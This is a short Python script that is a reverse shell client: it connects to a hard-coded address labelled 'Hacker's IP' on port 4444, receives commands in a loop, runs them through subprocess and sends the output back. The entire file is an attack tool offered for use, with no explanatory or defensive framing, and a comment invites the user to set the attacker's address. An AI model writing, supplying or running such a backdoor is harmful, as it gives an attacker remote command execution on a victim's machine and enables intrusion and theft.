import socket as sc
import subprocess as sp

# Modify this
server = "192.0.0.1"  # Hacker's IP
port = 4444
entrance = sc.socket()
entrance.connect((server, port))

while True:
    command = entrance.recv(1024)
    command = command.decode()
    x = sp.Popen(command, shell=False, stderr=sp.PIPE, stdout=sp.PIPE)
    output = x.stdout.read()
    output_error = x.stderr.read()
    entrance.send(output + output_error)
